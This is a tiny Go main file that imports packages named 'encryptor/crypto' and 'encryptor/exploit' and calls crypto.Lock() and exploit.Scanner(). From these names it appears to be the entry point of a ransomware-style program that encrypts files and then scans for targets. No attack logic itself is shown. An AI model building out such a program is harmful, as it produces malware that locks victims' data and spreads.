package main

import (
	"gucci/encryptor/crypto"
	"gucci/encryptor/exploit"
)

func main() {
	crypto.Lock()
	exploit.Scanner()
}
